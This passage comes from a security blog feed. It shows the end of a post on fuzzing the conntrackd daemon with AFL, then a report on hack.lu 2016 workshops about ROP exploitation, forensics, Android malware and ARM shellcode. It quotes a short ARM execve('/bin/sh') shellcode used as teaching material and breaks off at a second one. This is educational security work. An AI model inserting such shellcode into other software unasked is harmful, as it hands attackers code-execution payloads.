<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">channel_handler</span>(<span style="color:#6ab825;font-weight:bold">void</span> *data)
{
	<span style="color:#6ab825;font-weight:bold">struct</span> channel *c = data;
	<span style="color:#6ab825;font-weight:bold">int</span> k;

	<span style="color:#6ab825;font-weight:bold">for</span> (k=<span style="color:#3677a9">0</span>; k&lt;CONFIG(event_iterations_limit); k++) {
		<span style="color:#6ab825;font-weight:bold">if</span> (channel_handler_routine(c) == -<span style="color:#3677a9">1</span>) {
			<span style="color:#6ab825;font-weight:bold">break</span>;
		}
	}
}
</code></pre></div><p>This will then call <a href="http://git.netfilter.org/conntrack-tools/tree/src/sync-mode.c#n178">channel_handler_routine</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">channel_handler_routine</span>(<span style="color:#6ab825;font-weight:bold">struct</span> channel *m)
{
	ssize_t numbytes;
	ssize_t remain, pending = cur - __net;
	<span style="color:#6ab825;font-weight:bold">char</span> *ptr = __net;

	numbytes = channel_recv(m, cur, <span style="color:#6ab825;font-weight:bold">sizeof</span>(__net) - pending);
	<span style="color:#6ab825;font-weight:bold">if</span> (numbytes &lt;= <span style="color:#3677a9">0</span>)
		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;

	remain = numbytes;
	<span style="color:#6ab825;font-weight:bold">if</span> (pending) {
		remain += pending;
		cur = __net;
	}

	<span style="color:#6ab825;font-weight:bold">while</span> (remain &gt; <span style="color:#3677a9">0</span>) {
		<span style="color:#6ab825;font-weight:bold">struct</span> nethdr *net = (<span style="color:#6ab825;font-weight:bold">struct</span> nethdr *) ptr;
		<span style="color:#6ab825;font-weight:bold">int</span> len;

		<span style="color:#999;font-style:italic">// HERE THE PACKET ITSELF IS ANALYZED
</span><span style="color:#999;font-style:italic"></span>		[...]
	}

	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
}
</code></pre></div><p>Obvisouly <a href="http://git.netfilter.org/conntrack-tools/tree/src/channel.c#n279">channel_recv</a> is called:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">channel_recv</span>(<span style="color:#6ab825;font-weight:bold">struct</span> channel *c, <span style="color:#6ab825;font-weight:bold">char</span> *buf, <span style="color:#6ab825;font-weight:bold">int</span> size)
{
	<span style="color:#6ab825;font-weight:bold">return</span> c-&gt;ops-&gt;recv(c-&gt;data, buf, size);
}
</code></pre></div><p>Depending on which channel (variable <code>c</code>) is currently active <code>channel_recv</code> will then call the channel&rsquo;s
<code>recv</code> function. The channel for UDP is stored in a structure called <a href="http://git.netfilter.org/conntrack-tools/tree/src/channel_udp.c#n128">channel_udp</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">struct</span> channel_ops channel_udp = {
	.headersiz	= <span style="color:#3677a9">28</span>, <span style="color:#999;font-style:italic">/* IP header (20 bytes) + UDP header 8 (bytes) */</span>
	.open		= channel_udp_open,
	.close		= channel_udp_close,
	.send		= channel_udp_send,
	.recv		= channel_udp_recv,
	.get_fd		= channel_udp_get_fd,
	.isset		= channel_udp_isset,
	.accept_isset	= channel_udp_accept_isset,
	.stats		= channel_udp_stats,
	.stats_extended = channel_udp_stats_extended,
};
</code></pre></div><p>As you can notice <code>channel_udp.recv</code> is a function pointer to <a href="http://git.netfilter.org/conntrack-tools/tree/src/channel_udp.c#n49">channel_udp_recv</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">int</span>
<span style="color:#447fcf">channel_udp_recv</span>(<span style="color:#6ab825;font-weight:bold">void</span> *channel, <span style="color:#6ab825;font-weight:bold">char</span> *buf, <span style="color:#6ab825;font-weight:bold">int</span> size)
{
	<span style="color:#6ab825;font-weight:bold">struct</span> udp_channel *m = channel;
	<span style="color:#6ab825;font-weight:bold">return</span> udp_recv(m-&gt;server, buf, size);
}
</code></pre></div><p>So now we&rsquo;re getting closer to the function that is actually responsible for reading data from the wire. In <a href="http://git.netfilter.org/conntrack-tools/tree/src/udp.c#n193">udp_recv</a> all the magic happens:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">ssize_t <span style="color:#447fcf">udp_recv</span>(<span style="color:#6ab825;font-weight:bold">struct</span> udp_sock *m, <span style="color:#6ab825;font-weight:bold">void</span> *data, <span style="color:#6ab825;font-weight:bold">int</span> size)
{
	ssize_t ret;
	socklen_t sin_size = <span style="color:#6ab825;font-weight:bold">sizeof</span>(<span style="color:#6ab825;font-weight:bold">struct</span> sockaddr_in);

        ret = recvfrom(m-&gt;fd,
		       data, 
		       size,
		       <span style="color:#3677a9">0</span>,
		       (<span style="color:#6ab825;font-weight:bold">struct</span> sockaddr *)&amp;m-&gt;addr,
		       &amp;sin_size);
	<span style="color:#6ab825;font-weight:bold">if</span> (ret == -<span style="color:#3677a9">1</span>) {
		<span style="color:#6ab825;font-weight:bold">if</span> (errno != EAGAIN)
			m-&gt;stats.error++;
		<span style="color:#6ab825;font-weight:bold">return</span> ret;
	}

	m-&gt;stats.bytes += ret;
	m-&gt;stats.messages++;

	<span style="color:#6ab825;font-weight:bold">return</span> ret;
}
</code></pre></div><p>Nothing special about: Just call <code>recvfrom</code>, read the data into <code>data</code> and update some statistics.</p>
<h3 id="the-plan">The plan</h3>
<p>If we want to do some fuzzing we&rsquo;ll have to modify <code>udp_recv</code> to read from some file instead of sockets. Re-writing
the function was actually a quite easy task:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#ifdef FUZZ
</span><span style="color:#cd2828;font-weight:bold"></span>ssize_t <span style="color:#447fcf">my_udp_recv</span>(<span style="color:#6ab825;font-weight:bold">struct</span> udp_sock *m, <span style="color:#6ab825;font-weight:bold">void</span> *data, <span style="color:#6ab825;font-weight:bold">int</span> size, <span style="color:#6ab825;font-weight:bold">char</span> *filename) {
    ssize_t ret;
    <span style="color:#6ab825;font-weight:bold">long</span> f_size;
    FILE *f;
	socklen_t sin_size = <span style="color:#6ab825;font-weight:bold">sizeof</span>(<span style="color:#6ab825;font-weight:bold">struct</span> sockaddr_in);

    <span style="color:#999;font-style:italic">// Read file
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> (!(f = fopen(CONFIG(fuzz_file), <span style="color:#ed9d13">&#34;rb&#34;</span>))) {
        fprintf(stderr, <span style="color:#ed9d13">&#34;[FUZZ] Couldn&#39;t open file</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
        exit(<span style="color:#3677a9">1</span>);
    }
  
    <span style="color:#999;font-style:italic">// Get file length
</span><span style="color:#999;font-style:italic"></span>    fseek(f, <span style="color:#3677a9">0L</span>, SEEK_END);
    f_size = ftell(f);
    rewind(f);

    ret = fread(data, f_size, <span style="color:#3677a9">1</span>, f);
    fclose(f);
	
    <span style="color:#6ab825;font-weight:bold">if</span> (ret == -<span style="color:#3677a9">1</span>) {
		<span style="color:#6ab825;font-weight:bold">if</span> (errno != EAGAIN)
			m-&gt;stats.error++;
		<span style="color:#6ab825;font-weight:bold">return</span> ret;
    }
	
    m-&gt;stats.bytes += f_size;
	m-&gt;stats.messages++;

	<span style="color:#6ab825;font-weight:bold">return</span> f_size;
}
<span style="color:#cd2828;font-weight:bold">#endif
</span></code></pre></div><p>Easy, right? Now <code>my_udp_recv</code> will read the file specified by <code>filename</code> and store the contents inside <code>data</code>. However,
this simple modification implied several changes across the whole base.</p>
<blockquote>
<p>You can see the whole changes <a href="https://github.com/dorneanu/conntrack-fuzzing/search?utf8=%E2%9C%93&amp;q=udp_recv">here</a>.</p>
</blockquote>
<p>Afterwards I was able to compile the code with this new feature:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git clone https://github.com/dorneanu/conntrack-fuzzing
$ cd conntrack-fuzzing
$ CFLAGS=-DFUZZ LDFLAGS=-ldl ./configure
[...]
$ ./src/conntrackd --help 
Connection tracking userspace daemon v1.4.4
Usage: ./src/conntrackd [commands] [options]

Daemon mode commands:
  -X [fuzz-file], specify fuzz file
  -d [options]          Run in daemon mode

[...]
</code></pre></div><p>Now you can specify a file (<code>-X</code>) which will be used as parameter for <code>my_udp_recv</code>. The &ldquo;daemon&rdquo; will now just read
the contents of the file, analyze the input and then simply exit.</p>
<h2 id="generating-input-values">Generating input values</h2>
<p>Now that I was able to specify files as data input, I had to generate some input examples for the screening process of <code>AFL</code>.
By sniffing enought traffic between 2 productive hosts running <code>conntrackd</code> I got a <strong>lots</strong> of payloads I could then use
for <code>AFL</code>. All I had to do was to store those values as binary files:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In [1]: payload = &#34;1000003c5815c1c9000c00000a171f0cc3b265fa000800050000019800050002110000000008000305be0035000800060000001e0008000c7e64b2c3&#34;

In [2]: import binascii

In [3]: with open(&#34;/tmp/input1&#34;, &#34;wb&#34;) as f:
   ...:     f.write(binascii.unhexlify(payload))
   ...:     f.close()
   ...: 

In [4]: !hexdump -C /tmp/input1
00000000  10 00 00 3c 58 15 c1 c9  00 0c 00 00 0a 17 1f 0c  |...&lt;X...........|
00000010  c3 b2 65 fa 00 08 00 05  00 00 01 98 00 05 00 02  |..e.............|
00000020  11 00 00 00 00 08 00 03  05 be 00 35 00 08 00 06  |...........5....|
00000030  00 00 00 1e 00 08 00 0c  7e 64 b2 c3              |........~d..|
0000003c
</code></pre></div><p>For my test cases I&rsquo;ve chosen ca. 4-5 different payloads and stored them as binary files. Now I was ready to run <code>AFL</code>.</p>
<h2 id="prepare-for-afl">Prepare for AFL</h2>
<p>Inside the project I&rsquo;ve then created the directory structure for <code>AFL</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ mkdir -p fuzzing/{ftfw,notrack}/input
</code></pre></div><p>For every sync mode (ftwfw and notrack) I&rsquo;ve then copied the input values into <code>input</code>. As a next step I had to compile the source using
<code>afl-gcc</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ CC=afl-gcc AFL_USE_ASAN=1 CFLAGS=-DFUZZ LDFLAGS=-ldl ./configure
[...]
$ make -j 4
[...]
</code></pre></div><h2 id="running-afl">Running AFL</h2>
<p><code>AFL</code> itself had to be ran as <code>root</code> since <code>conntrackd</code> requires privileged permissions:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo core &gt;/proc/sys/kernel/core_pattern
$ afl-fuzz -i fuzzing/ftfw/input/ -o fuzzing/ftfw/output ./src/conntrackd -C conntrackd.conf -X @@
[+] You have 2 CPU cores and 1 runnable tasks (utilization: 50%).
[+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt.
[*] Checking core_pattern...
[*] Setting up output directories...
[*] Scanning &#39;fuzzing/ftfw/input/&#39;...
[+] No auto-generated dictionary tokens to reuse.
[*] Creating hard links for all input files...
[*] Validating target binary...
[*] Attempting dry run with &#39;id:000000,orig:r1&#39;...
[*] Spinning up the fork server...
[+] All right - fork server is up.
    len = 136, map size = 597, exec speed = 3185 us
[*] Attempting dry run with &#39;id:000001,orig:r2&#39;...
    len = 204, map size = 622, exec speed = 2569 us
[*] Attempting dry run with &#39;id:000002,orig:r3&#39;...
    len = 68, map size = 619, exec speed = 2545 us
[*] Attempting dry run with &#39;id:000003,orig:r4&#39;...
    len = 476, map size = 597, exec speed = 2867 us
[!] WARNING: No new instrumentation output, test case may be useless.
[+] All test cases processed.

[!] WARNING: Some test cases look useless. Consider using a smaller set.
[+] Here are some useful stats:

    Test case count : 2 favored, 0 variable, 4 total
       Bitmap range : 597 to 622 bits (average: 608.75 bits)
        Exec timing : 2545 to 3185 us (average: 2792 us)

[*] No -t option specified, so I&#39;ll use exec timeout of 20 ms.
[+] All set and ready to roll!

[...]
</code></pre></div><p>You can also monitor the current input using:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ watch -n1 &#39;cat fuzzing/ftfw/output/.cur_input | hexdump -C&#39;
</code></pre></div><h2 id="results">Results</h2>
<p>While the <strong>preparation</strong> steps were indeed time-consuming I think I have definitely improved my <code>gdb</code>
skills looking at the code and trying to understand how things work. Additionally I was able to trace
the data flow within the code - from the sockets till to the functions where data got analyzed. The
<strong>fuzzing process</strong> itself was quite straight-forward and mainly managed by <code>AFL</code> itself. Unfortunately
(depends on the perspective you&rsquo;re looking from) I wasn&rsquo;t able to find any crashes inside <code>conntrack-tools</code>
which is actually good. By crashing the daemon some network connectivity would have been heavily
affected. But again: The fact that I wasn&rsquo;t able to find any issues, is no guarantee for secure software.
Maybe other will have a look at the code and do some <strong>static code analysis</strong>.</p>
<p>For me personally this was a hell of fun and I&rsquo;m already looking forward to my next fuzzing project. Stay tuned
and feel free to drop your comments for additional questions/suggestions regarding the steps explained here.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>hack.lu conference 2016</title>
      <link>https://blog.dornea.nu/2016/10/21/hack.lu-conference-2016/</link>
      <pubDate>Fri, 21 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/10/21/hack.lu-conference-2016/</guid>
      <content:encoded><![CDATA[<p>This year I&rsquo;ve attended the <a href="https://2016.hack.lu">hack.lu</a> conference in Luxembourg. Being actually for the
first time there, I&rsquo;ve had absolutely no expectations. In fact it was a really lovelly and warm athmosphere during the whole
conference and I&rsquo;ve met a lot of interesting persons.</p>
<p><img src="https://pbs.twimg.com/media/CvDP9L6WYAASFMS.jpg" alt=""></p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">A nice <a href="https://twitter.com/hack_lu">@hack_lu</a> logo made with the <a href="https://twitter.com/Level2Lu">@Level2Lu</a> 3d printer during <a href="https://twitter.com/hashtag/hacklu?src=hash">#hacklu</a>. <a href="https://t.co/jFB1wlw5uS">pic.twitter.com/jFB1wlw5uS</a></p>&mdash; hack_lu (@hack_lu) <a href="https://twitter.com/hack_lu/status/788360243659104256">October 18, 2016</a></blockquote>
<h2 id="talks">Talks</h2>
<p>I think there were some realy good talks. Unfortunately I&rsquo;ve seen only 1 because most of the time I was at the workshops practicing
my <strong>reverse engineering</strong> skills. If you want to know more about the talks, read here:</p>
<ul>
<li><a href="https://blog.rootshell.be/2016/10/18/hack-lu-2016-wrap-day-1/">Wrap-Up Day #1</a></li>
<li><a href="https://blog.rootshell.be/2016/10/20/hack-lu-2016-wrap-day-2/">Wrap-Up Day #2</a></li>
<li><a href="https://blog.rootshell.be/2016/10/20/hack-lu-2016-wrap-day-3/">Wrap-Up Day #3</a></li>
</ul>
<p>If you&rsquo;re looking for the talks, have a look at <a href="https://www.youtube.com/channel/UCI6B0zYvK-7FdM0Vgh3v3Tg">this channel</a>.</p>
<h2 id="workshops">Workshops</h2>
<p>Below the workshops I have attented:</p>
<h3 id="advanced-exploitation-rop">Advanced Exploitation: ROP</h3>
<p><img src="https://pbs.twimg.com/media/Cu_WmrpWgAA-5Dd.jpg" alt=""></p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Ready for tomorrowâ€™s workshop on ROP exploitation at <a href="https://twitter.com/hack_lu">@hack_lu</a> <a href="https://twitter.com/KudelskiSec">@KudelskiSec</a> <a href="https://t.co/M5F2F2V44N">pic.twitter.com/M5F2F2V44N</a></p>&mdash; Julien Bachmann (@milkmix_) <a href="https://twitter.com/milkmix_/status/788084491483017216">October 17, 2016</a></blockquote>
<p>The <a href="http://2016.hack.lu/talks/#advanced-exploitation-rop-and-protections-bypass-under-linux">Advanced Exploitation: ROP and protections bypass under Linux</a>
course by <a href="https://twitter.com/milkmix_">Julien Bachmann</a> was my first one and very <strong>good</strong>. It&rsquo;s not that I haven&rsquo;t heard
of <strong>ROP</strong> (Return Oriented Programming) before, it was rather a lack of time which prevented me going deep-dive into this
specific topic. After refreshing knowledge how programms get executed and how function calls are working, basic
exploitation techniques like <strong>stack based overflows</strong> were introduced to the audience. <strong>Debugging</strong> frameworks like
<a href="https://github.com/hugsy/gef">GEF</a> and <a href="https://github.com/longld/peda">PEDA</a> were shortly explained and used
to examine the stack and registers during the exploitation.</p>
<p>Thereafter the basic ideas behind <strong>ROP</strong> were presented: Instead of bringing sth <strong>into</strong> the process, ROP will use
pieces of code fragments <strong>inside</strong> the process to conduct the attack. That means: In a classical <em>stack based
overlow</em> attack one will try to overlow some buffer, control the return address of a function and put some code (shellcode)
on the stack that might get executed. Binary exploitation <strong>countermeasures</strong> like <strong>ASRL</strong> or <strong>NX</strong> have introduced
new methods how to protect against such attacks. However, new exploitation techniques have been found to circumvent
those. Starting with <strong>ret2libc</strong> ROP <strong>gadgets</strong> were basically the further development. The main idea behing <strong>ret2libc</strong>
was to call <strong>libc</strong> functions directly instead of using <strong>syscalls</strong>. In this case the calling convention (how to push the parameters
for the function into the stack) had to be taken into account. Finding some good examples on the net should be not that hard.</p>
<p>In the world of ROP specific code fragments have to be used in a certain order to build a <strong>ROP chain</strong>. That means that by pushing
some data (mostly addresses) into the stack and having a buffer overflow we can control the program execution depending on the data
being pushed into the stack.</p>
<blockquote>
<p>Make sure to have a look at <a href="https://speakerdeck.com/milkmix/advanced-exploitation-on-linux-rop-and-infoleaks">https://speakerdeck.com/milkmix/advanced-exploitation-on-linux-rop-and-infoleaks</a>
for more detailed explanations.</p>
</blockquote>
<p>Finding ROP gadgets is actually also an easy task. There are several tools which will help you finding those:</p>
<ul>
<li><a href="https://github.com/packz/ropeme">ropeme</a></li>
<li><a href="https://github.com/sashs/Ropper">ropper</a></li>
<li><a href="https://github.com/JonathanSalwan/ROPgadget">ropgadget</a></li>
<li><a href="https://github.com/0vercl0k/rp">rp++</a></li>
</ul>
<p>Some of the useful gadgets would be:</p>
<ul>
<li>redirect execution to address pointed by some register</li>
<li>stack pivot (change the original stack to sth different; that might be the heap)</li>
<li>set register values</li>
<li>read at a memory address</li>
<li>&ldquo;write-what-where&rdquo;</li>
<li>syscall (<code>int 0x80</code> for x86)</li>
</ul>
<p>Julien also provided live examples for ROP exploitation. Make sure you do have a look at <a href="https://github.com/0xmilkmix/training">https://github.com/0xmilkmix/training</a>.
All in one this was an <strong>excellent</strong> introduction to <strong>ROP</strong> which during the 4h course provided enough information to be &ldquo;armed&rdquo; for your next target.
Probably I would have spent more than 2 weeks to accumulate the same amount of information. A big thanks to <a href="https://twitter.com/milkmix_">Julien</a>
his training and explanations.</p>
<h3 id="the-fantastic-4-forensic-domains-net-disk-mem-mal">The Fantastic 4 forensic domains: net, disk, mem, mal</h3>
<p>This <a href="http://2016.hack.lu/talks/#the-fantastic-4--forensic-domains-net-disk-mem-mal">workshop</a> aimed at showing the audience some techniques
and tools when it comes to <strong>DFIR</strong>. Having some data provided by the <a href="https://ccdcoe.org">NATO Cooperative Cyber Defence Centre of Excellence</a>
<a href="https://twitter.com/ddurvaux">David</a> and <a href="https://twitter.com/cvandeplas">Christophe</a> started looking at different aspects:</p>
<ul>
<li>network traffic</li>
<li>disk data</li>
<li>memory data</li>
<li>malware activities</li>
</ul>
<p>Rather than covering each aspect individually, a more interdisciplinary approach was prefered. By analysing the input sources and correlating
the results with some others would bring you more benefits than focusing only on a single task. Among some tips how to deal with the data source, some tools
mentioned as well:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Forensic_Toolkit">AccessData FTK Imager</a>
<ul>
<li>saves an image of a hard disk in one file or in segments</li>
</ul>
</li>
<li><a href="https://github.com/log2timeline/plaso/wiki">log2timeline</a>
<ul>
<li>check out the <a href="https://digital-forensics.sans.org/summit-archives/DFIR_Summit/Plaso-Reinventing-the-Super-Timeline-Kristinn-Gudjonsson.pdf">presentation</a></li>
<li>helps creating <em>super timelines</em> (correlation, context, confidence, sorted based on time)</li>
</ul>
</li>
<li><a href="http://www.rekall-forensic.com">rekall</a>
<ul>
<li>I know everybody knows about <a href="https://github.com/volatilityfoundation/volatility">volatility</a></li>
<li>but <code>rekall</code> should be <strong>faster</strong></li>
</ul>
</li>
</ul>
<p>One thing that caught my attention was the fact that when doing <strong>string analysis</strong>, you can use old good <code>strings</code> also for unicode strings:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ strings -eL &lt;file&gt;
</code></pre></div><p>From the manpage:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">--encoding=encoding
	   Select the character encoding of the strings that are to be found.  Possible values for encoding are: s = single-7-bit-byte characters (ASCII, ISO 8859, etc., default), S = single-8-bit-byte characters, b = 16-bit
	   bigendian, l = 16-bit littleendian, B = 32-bit bigendian, L = 32-bit littleendian.  Useful for finding wide character strings. (l and b apply to, for example, Unicode UTF-16/UCS-2 encodings).
</code></pre></div><p>Nice. Also make sure you&rsquo;ll have a look at the <a href="https://docs.google.com/presentation/d/1j1y97LUw9AHapfcFICVOZ3hGxaT6jYSwk_gm4iQjEnA/edit">presentation</a> and the <a href="http://vandeplas.com/hacklu/">provided data sources</a>. Happy DFIR!</p>
<h3 id="android-malware-reverse-engineering">Android malware reverse engineering</h3>
<p><img src="https://pbs.twimg.com/media/Cuu7qRlXgAATwsZ.jpg" alt=""></p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Ready for the <a href="https://twitter.com/hashtag/Android?src=hash">#Android</a> <a href="https://twitter.com/hashtag/RE?src=hash">#RE</a> <a href="https://twitter.com/hashtag/workshop?src=hash">#workshop</a> at <a href="https://twitter.com/hashtag/hacklu?src=hash">#hacklu</a> ;) cc: <a href="https://twitter.com/Fortinet">@Fortinet</a> <a href="https://t.co/gIClXygRUz">pic.twitter.com/gIClXygRUz</a></p>&mdash; Axelle Ap. (@cryptax) <a href="https://twitter.com/cryptax/status/786928903235497984">October 14, 2016</a></blockquote>
<p><a href="https://twitter.com/cryptax">Axelle Apvrille</a> had a workshop on <a href="http://2016.hack.lu/talks/#android-malware-reverse-engineering">Android Malware Reverse Engineering</a>. While the first part covered the
&ldquo;basics&rdquo; (static code analysis and dynamic analysis) not that interesting to me (due to previous work: <a href="http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/">here</a>, <a href="http://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox/">here</a> and also <a href="http://blog.dornea.nu/2014/08/21/howto-debug-android-apks-with-eclipse-and-ddms/">here</a>) the second part dealed with <strong>obfuscation</strong> and <strong>packed</strong> samples.</p>
<p>Installing the workshop VM (ca. 5 GB) was also quite easy:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ docker pull cryptax/android-re
$ docker run -d --name androidre -p 5022:22 -p 5900:5900 cryptax/android-re
</code></pre></div><p>Like mentioned before the 2nd part of the workshop was rather the fun part. By structuring the whole workshop in several labs, the students were able to dissect the APKs locally and play with
the provided tools. In lab 6 e.g. we had to analyze an <strong>infected version of Pokemon Go</strong> by using <a href="https://github.com/androguard/androguard">AndroGuard</a>. Students were then asked to
deobfuscate some code fragments (sth that I did when analyzing <a href="http://blog.dornea.nu/tag/fakebanker/">FakeBanker</a>). Then several <strong>unpacking</strong> techniques were shown:</p>
<ul>
<li>unpacking <a href="http://strazzere.com/papers/AAP-QPSI.pdf">Pangxie</a></li>
<li>unpacking via memory dump (files were packed by <strong>LIAPP</strong>)</li>
</ul>
<p>One tool I&rsquo;d like to mention when it comes to decompiling is <a href="https://www.pnfsoftware.com/jeb2/">JEB</a>. It really helps you analyze your target
using a nice GUI <strong>and</strong> it is <strong>extensible</strong>: Using Java or Python you can write your own scripts to automate the reverse engineering process.</p>
<p>If you don&rsquo;t know which <strong>packer</strong> has been used <a href="https://github.com/rednaga/APKiD">APKI</a> might be helpful. BTW: The <a href="http://rednaga.io">rednaga</a> team also haves an <a href="https://github.com/rednaga/training">Android training</a>.
Make sure you&rsquo;ll have a look at their materials. They&rsquo;re really good.</p>
<p>All in one this was a very good workshop. Using the mentioned techniques you should be able to reverse <strong>DEX</strong> files easily. In case of <a href="https://developer.android.com/ndk/samples/sample_hellojni.html">JNIs</a>
you&rsquo;ll have to go back to binary analysis since a malware could hide its all components inside a shared object (ELF). Besides that there is also <a href="https://source.android.com/devices/tech/dalvik/">ART</a>
which basically converts the bytecode into machine code (sampled inside an <a href="http://stackoverflow.com/questions/28435860/what-does-oat-mean">OAT</a> file). Regarding ART: This <a href="https://www.youtube.com/watch?v=tSQxuxmzXCc&amp;list=PLH15HpR5qRsVol8qseSSVe4XrtHcZO47E&amp;index=21">video</a> will give you a nice introduction.</p>
<h3 id="arm-shellcode-basics">ARM Shellcode Basics</h3>
<p>I think this one was my favourite one. <a href="https://twitter.com/therealsaumil">Saumil Shah</a> introduced to the basics of the ARM architecture before
he got into the <a href="http://2016.hack.lu/talks/#arm-shellcode-basics">ARM Shellcode Basics</a>. Again I&rsquo;ve learnt a lot about ARM in just few hours.</p>
<p><img src="https://pbs.twimg.com/media/CvMo1okXYAEZkqW.jpg" alt=""></p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Introduction to ARM Shellcoding by <a href="https://twitter.com/therealsaumil">@therealsaumil</a> Great! <a href="https://twitter.com/hashtag/hacklu?src=hash">#hacklu</a> <a href="https://t.co/DOjLL5TbAp">pic.twitter.com/DOjLL5TbAp</a></p>&mdash; Victor Dorneanu (@victordorneanu) <a href="https://twitter.com/victordorneanu/status/789019299855863808">October 20, 2016</a></blockquote>
<p>During the workshop we were able to write and run ARM assembly on a Raspberry Pi Saumil provided. This way we were able to test and run
the shellcodes on real ARM hardware without any emulators.</p>
<p><img src="https://pbs.twimg.com/media/CvMq7eoVUAApWFe.jpg" alt=""></p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">ARM Shellcode Workshop <a href="https://twitter.com/hashtag/hacklu?src=hash">#hacklu</a> - my mini Raspberry Pi NOC, with battery backup <a href="https://t.co/FoOrH2p5ze">pic.twitter.com/FoOrH2p5ze</a></p>&mdash; Saumil Shah (@therealsaumil) <a href="https://twitter.com/therealsaumil/status/789021572958789632">October 20, 2016</a></blockquote>
<p>After the workshop the difference between <strong>ARM mode</strong> and <strong>Thumb mode</strong> seems to be much more clear. Also the fact that most of
the ARM shellcodes are in thumb mode was discussed extensively.</p>
<p>Writing ARM shellcodes doesn&rsquo;t differ that much from the x86 way. Being equipped with good knowlegde how syscalls work on ARM
and which parameters you need to use insde the registers (in ARM you don&rsquo;t push the arguments on the stack) you should be able to
write your very first shellcode. In fact it is much easier to write ASM assembly due to the small instruction set (you do have a lot of
variations but the set is much smaller than the x68 one). Just one example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">* ARM execve shellcode
 * --------------------
 * by Saumil Shah, ARM Exploit Lab
 * @therealsaumil
 *
 * execve(&#34;/bin/sh&#34;, 0, 0)
 *
 * as exec_arm.s -o exec_arm.o
 * ld exec_arm.o -o exec_arm
 */

.section .text
.global _start
_start:
    add     r0, pc, #12
    mov     r1, #0
    mov     r2, #0

    mov     r7, #11          /* syscall 11, execve */
    svc     #0

.ascii &#34;/bin/sh\0&#34;
</code></pre></div><p>Switching between the modes is also very simple:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/* ARM/THUMB execve shellcode
 * --------------------------
 * by Saumil Shah, ARM Exploit Lab
 * @therealsaumil
 *
 * execve(&#34;/bin/sh&#34;, 0, 0)
 *
 * as exec_thumb.s -o exec_thumb.o
 * ld exec_thumb.o -o exec_thumb
 */

